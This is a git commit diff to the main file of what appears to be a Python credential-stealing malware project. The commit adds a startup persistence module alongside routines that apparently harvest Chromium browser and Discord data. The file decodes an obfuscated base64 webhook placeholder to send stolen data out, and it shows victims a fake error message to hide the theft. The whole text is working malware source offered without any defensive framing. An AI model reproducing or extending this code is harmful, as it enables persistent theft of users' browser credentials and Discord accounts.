2c003b99382f49de5cb924ad6630ec75e1d6340d
addi00000 <addison@othius.com>
2022-09-06 19:53:31 -0400

    Startup injection

--- src/main.py
+++ src/main.py
@@ -3,6 +3,7 @@ from util.debug import *
 from util.discord import *
 from util.fakeerror import *
 from util.injection import *
+from util.startup import *
 from util.sysinfo import *
 
 __WEBHOOK__ = __import__("base64").b64decode("&WEBHOOK_URL_ENC&").decode("utf-8")
@@ -11,9 +12,10 @@ __USE_ERROR_MESSAGE__ = False
 __ERROR_MESSAGE__ = __import__("base64").b64decode("&ERROR_MESSAGE_ENC&").decode("utf-8")
 
 def main(webhook: str) -> None:   
-    debug()
-     
+
     funcs = [
+        debug,
+        startup,
         injection,
         chromium,
         discord,
@@ -21,7 +23,11 @@ def main(webhook: str) -> None:
     ]
 
     for func in funcs:
-        func(webhook)
+        if type(func) == type:
+            [func(webhook) if 'webhook' in func.__init__.__code__.co_varnames else func()]
+                
+        else:
+            [func(webhook) if 'webhook' in func.__code__.co_varnames else func()]
     
     if __USE_ERROR_MESSAGE__:
         fake_error(__ERROR_MESSAGE__)
